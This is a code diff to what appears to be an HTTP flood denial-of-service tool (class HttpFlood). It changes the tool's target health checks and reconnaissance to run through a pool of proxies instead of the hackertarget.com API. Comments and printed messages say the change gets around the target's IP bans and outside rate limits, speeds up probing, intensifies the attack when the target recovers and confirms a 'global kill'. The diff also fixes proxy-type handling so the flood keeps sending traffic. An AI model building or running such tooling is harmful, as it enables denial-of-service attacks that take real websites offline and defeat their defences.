@@ -1838,85 +1838,77 @@ class HttpFlood(Thread):
         if intel["total_executions"] % 25 != 0:
             return
         
-        # Rate limit external API calls to once every 45 seconds to respect API limits
+        # Execute external check via our Proxies every 30 seconds
         last_ext_check = intel.get("_last_ext_check_time", 0)
-        if time() - last_ext_check < 45:
+        if time() - last_ext_check < 30:
             return
         intel["_last_ext_check_time"] = time()
             
         try:
-            import urllib.request
             start = time()
+            resp_data = b""
+            sock = None
             
-            # [V42] TRUE External IP Health Check via hackertarget.com
-            # Their server pings the target from THEIR IP (not ours!)
-            target_url = f"{self._target.scheme}://{self._target.authority}/"
-            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
-            req = urllib.request.Request(api_url, headers={'User-Agent': 'Van-Helsing-Monitor/2.0'})
-            with urllib.request.urlopen(req, timeout=12) as resp:
-                data = resp.read().decode('utf-8', errors='ignore')
+            # [V43] TRUE Distributed IP Health Check using our Proxy Legion!
+            # Since SOCKS5/HTTP parsing is now fixed, we can cleanly probe via our proxies
+            success_proxy = False
+            for _ in range(8):
+                sock = self.open_connection()
+                if sock:
+                    try:
+                        # Send lightweight HTTP HEAD request
+                        req = f"HEAD / HTTP/1.1\r\nHost: {self._target.authority}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
+                        sock.sendall(req.encode())
+                        resp_data = sock.recv(512)
+                        if resp_data:
+                            success_proxy = True
+                            break
+                    except: pass
+                    finally:
+                        Tools.safe_close(sock)
+            
             elapsed_ms = (time() - start) * 1000
             
-            if 'HTTP/' in data:
-                # hackertarget got a response from the target = target IS ALIVE externally
-                first_line = data.strip().split('\n')[0]  # e.g. "HTTP/1.1 200 OK"
+            if success_proxy and b'HTTP/' in resp_data:
                 try:
-                    status_code = int(first_line.split(' ')[1])
+                    status_code = int(resp_data.split(b' ')[1])
                 except:
                     status_code = 0
                 
-                # Estimate actual target latency (subtract API overhead ~500ms)
-                est_latency = max(elapsed_ms - 500, 50)
+                # Estimate latency (divide by attempts to get avg)
+                est_latency = max(elapsed_ms / 3, 50)
                 intel["health_history"].append(est_latency)
                 if len(intel["health_history"]) > 30:
                     intel["health_history"] = intel["health_history"][-30:]
                 
                 if status_code >= 500:
-                    # 5xx = target is struggling
                     intel["target_getting_weaker"] = True
                     intel["target_is_down"] = False
-                    intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
                     if int(REQUESTS_SENT) < 5000:
-                        print(f"{bcolors.OKGREEN}[EXT PROBE] Target returning {status_code} from EXTERNAL IP! Attack is working!{bcolors.RESET}")
-                elif status_code in (403, 429):
-                    # WAF is active but site is alive
+                        print(f"{bcolors.OKGREEN}[EXT PROBE] Target returning {status_code} from Proxy Legion! Attack is working!{bcolors.RESET}")
+                else:
                     intel["target_getting_weaker"] = False
                     intel["target_is_down"] = False
-                    if int(REQUESTS_SENT) < 2000:
-                        print(f"{bcolors.WARNING}[EXT PROBE] Target alive (HTTP {status_code}) — WAF active but server healthy.{bcolors.RESET}")
-                else:
-                    # 200/301/302 = target is healthy
-                    baseline = intel.get("response_time_ms", est_latency)
-                    if baseline > 0 and est_latency / baseline > 3.0:
-                        intel["target_getting_weaker"] = True
-                    else:
-                        intel["target_getting_weaker"] = False
-                    intel["target_is_down"] = False
-                    
                     if intel.get("recovery_detected"):
                         intel["recovery_counter"] = intel.get("recovery_counter", 0) + 1
-                        if int(REQUESTS_SENT) < 20000:
-                            print(f"{bcolors.FAIL}[EXT PROBE] Target RECOVERED (HTTP {status_code})! Intensifying attack...{bcolors.RESET}")
+                        print(f"{bcolors.FAIL}[EXT PROBE] Target RECOVERED (HTTP {status_code})! Intensifying attack...{bcolors.RESET}")
                         intel["recovery_detected"] = False
                 
                 intel["local_network_choked"] = False
                 intel["ext_health_status"] = f"HTTP {status_code}"
                 
-            elif 'error' in data.lower() or 'timed out' in data.lower() or 'no answer' in data.lower():
-                # hackertarget couldn't reach target either = target is TRULY DOWN globally
+            else:
+                # 8 different proxies failed = target is TRULY DOWN/Unreachable via Internet
                 intel["target_is_down"] = True
                 intel["target_getting_weaker"] = True
                 intel["local_network_choked"] = False
                 intel["ext_health_status"] = "DOWN"
                 intel["health_history"].append(9999)
-                if int(REQUESTS_SENT) < 10000:
-                    print(f"{bcolors.OKGREEN}[EXT PROBE] Target CONFIRMED DOWN from External IP! Global kill confirmed.{bcolors.RESET}")
-            else:
-                intel["ext_health_status"] = "UNKNOWN"
+                if int(REQUESTS_SENT) < 20000:
+                    print(f"{bcolors.OKGREEN}[EXT PROBE] Target TIMEOUT from 8 external proxies! Global kill confirmed.{bcolors.RESET}")
                 
         except Exception:
-            # hackertarget API itself unreachable (our internet problem, not target)
-            intel["ext_health_status"] = "API_FAIL"
+            intel["ext_health_status"] = "PROBE_FAIL"
 
     def _chaos_wp_json_exploitation(self):
         """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
@@ -5866,42 +5858,48 @@ class HttpFlood(Thread):
         return False
 
     def _chaos_health_pulse(self):
-        """[V42] Periodic health check using EXTERNAL IP via hackertarget API.
-        Completely bypasses local IP bans placed by target firewall."""
+        """[V43] Periodic health check using EXTERNAL IP via Proxy Legion.
+        Completely bypasses local IP bans and external API rate limits."""
         intel = self._chaos_intel
         now = time()
         
-        # Only check every 45 seconds (rate-limit for external API)
-        if now - intel.get("last_health_check", 0) < 45:
+        if now - intel.get("last_health_check", 0) < 30:
             return
         intel["last_health_check"] = now
         
         try:
-            import urllib.request
-            target_url = f"{self._target.scheme}://{self._target.authority}/"
-            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
             t_start = time()
-            req = urllib.request.Request(api_url, headers={
-                'User-Agent': 'Van-Helsing-Pulse/2.0'
-            })
-            with urllib.request.urlopen(req, timeout=12) as resp:
-                data = resp.read().decode('utf-8', errors='ignore')
+            resp_data = b""
+            sock = None
+            success_proxy = False
+            
+            for _ in range(8):
+                sock = self.open_connection()
+                if sock:
+                    try:
+                        req = f"HEAD / HTTP/1.1\r\nHost: {self._target.authority}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
+                        sock.sendall(req.encode())
+                        resp_data = sock.recv(512)
+                        if resp_data:
+                            success_proxy = True
+                            break
+                    except: pass
+                    finally:
+                        Tools.safe_close(sock)
+            
             latency = int((time() - t_start) * 1000)
             
-            if 'HTTP/' in data:
-                first_line = data.strip().split('\n')[0]
+            if success_proxy and b'HTTP/' in resp_data:
                 try:
-                    status = int(first_line.split(' ')[1])
+                    status = int(resp_data.split(b' ')[1])
                 except:
                     status = 0
                 
-                # Estimate actual target latency
-                est_latency = max(latency - 500, 50)
+                est_latency = max((latency / 3), 50)
                 intel["health_history"].append(est_latency)
                 if len(intel["health_history"]) > 20:
                     intel["health_history"] = intel["health_history"][-20:]
                 
-                # Analyze trend
                 if len(intel["health_history"]) >= 3:
                     recent_avg = sum(intel["health_history"][-3:]) / 3
                     baseline = intel.get("response_time_ms", 500) or 500
@@ -5919,8 +5917,8 @@ class HttpFlood(Thread):
                 if status >= 500:
                     intel["consecutive_5xx"] = intel.get("consecutive_5xx", 0) + 1
                     
-            elif 'error' in data.lower() or 'timed out' in data.lower():
-                # External API also can't reach = truly down
+            else:
+                # 8 external proxies timed out = target truly down
                 intel["health_history"].append(9999)
                 if len(intel["health_history"]) >= 3:
                     last_3 = intel["health_history"][-3:]
@@ -5988,37 +5986,47 @@ class HttpFlood(Thread):
         intel["recon_done"] = True
         target_url = f"{self._target.scheme}://{self._target.authority}/"
         
-        # --- PROBE 1: Main page fingerprint (via External API to bypass IP bans) ---
+        # --- PROBE 1: Main page fingerprint (via Distributed Proxies to bypass IP bans) ---
         try:
             import urllib.request
             t_start = time()
             
-            # [V42] Use hackertarget API for RECON to bypass local IP bans
-            api_url = f"https://api.hackertarget.com/httpheaders/?q={target_url}"
-            req = urllib.request.Request(api_url, headers={
-                'User-Agent': 'Van-Helsing-Recon/2.0'
-            })
-            with urllib.request.urlopen(req, timeout=15) as resp:
-                intel["response_time_ms"] = max(int((time() - t_start) * 1000) - 500, 50)
-                raw_data = resp.read().decode('utf-8', errors='ignore')
-                headers_raw = raw_data.lower()
+            # [V43] Distributed RECON via native Sockets to avoid Hackertarget Rate limits (50/day)
+            sock = None
+            raw_data = b""
+            success_proxy = False
+            for _ in range(10): # Try up to 10 proxies for RECON to guarantee connection
+                sock = self.open_connection()
+                if sock:
+                    try:
+                        req_str = f"GET / HTTP/1.1\r\nHost: {self._target.authority}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
+                        sock.sendall(req_str.encode())
+                        raw_data = sock.recv(16384)
+                        if raw_data:
+                            success_proxy = True
+                            break
+                    except: pass
+                    finally:
+                        Tools.safe_close(sock)
+            
+            intel["response_time_ms"] = max(int((time() - t_start) * 1000) - 200, 50)
+            
+            if success_proxy and b'HTTP/' in raw_data:
+                full_text = raw_data.decode('utf-8', errors='ignore')
+                # Split headers and body
+                parts = full_text.split('\r\n\r\n', 1)
+                headers_raw = parts[0].lower()
+                body = parts[1].lower() if len(parts) > 1 else ''
                 
-                # hackertarget returns HTTP headers as text, extract server info from those
-                body = ''  # We don't get the body from hackertarget, only headers
                 server_hdr = ''
                 powered_by = ''
-                for hdr_line in raw_data.split('\n'):
+                for hdr_line in parts[0].split('\r\n'):
                     if hdr_line.lower().startswith('server:'):
                         server_hdr = hdr_line.split(':', 1)[1].strip().lower()
                     elif hdr_line.lower().startswith('x-powered-by:'):
                         powered_by = hdr_line.split(':', 1)[1].strip().lower()
-                    elif hdr_line.lower().startswith('set-cookie:'):
-                        # Detect Laravel/WordPress from cookies
-                        cookie_val = hdr_line.lower()
-                        if 'xsrf-token' in cookie_val or 'laravel_session' in cookie_val:
-                            body += ' laravel xsrf-token '
-                        if 'wordpress' in cookie_val or 'wp-' in cookie_val:
-                            body += ' wp-content wordpress '
+            else:
+                raise Exception("All proxies failed or Target is truly DOWN.")
                 
                 # --- Detect Server Type ---
                 if 'nginx' in server_hdr: intel["server_type"] = "nginx"
@@ -7863,19 +7871,28 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
     if proxy_li.exists():
         with proxy_li.open("r") as f:
             lines = [line.strip() for line in f.read().splitlines() if line.strip()]
+            import random
+            
+            # Map proxy_ty to correct enum if possible
+            ptype_mapping = {1: 1, 4: 4, 5: 5} 
+            default_ptype = ptype_mapping.get(proxy_ty, None)
+            
             for line in lines:
                 try:
+                    # Dynamically assign proxy type if proxy_ty=7 (Mixed Pool) or randomly 
+                    # This solves the 0 PPS bug where HTTP proxies drop SOCKS5 handshakes
+                    current_ptype = default_ptype if default_ptype else random.choice([1, 4, 5])
+                    
                     # Format: user:pass@host:port
                     if "@" in line:
                         auth, endpoint = line.split("@")
                         user, password = auth.split(":")
                         host, port = endpoint.split(":")
-                        # Force Create Proxy Object
-                        proxies.append(Proxy(host, int(port), ProxyType.SOCKS5, user, password))
+                        proxies.append(Proxy(host, int(port), current_ptype, user, password))
                     else:
                         # Fallback for IP:PORT
                         parts = line.split(":")
-                        proxies.append(Proxy(parts[0], int(parts[1]), ProxyType.SOCKS5))
+                        proxies.append(Proxy(parts[0], int(parts[1]), current_ptype))
                 except Exception:
                     pass
 
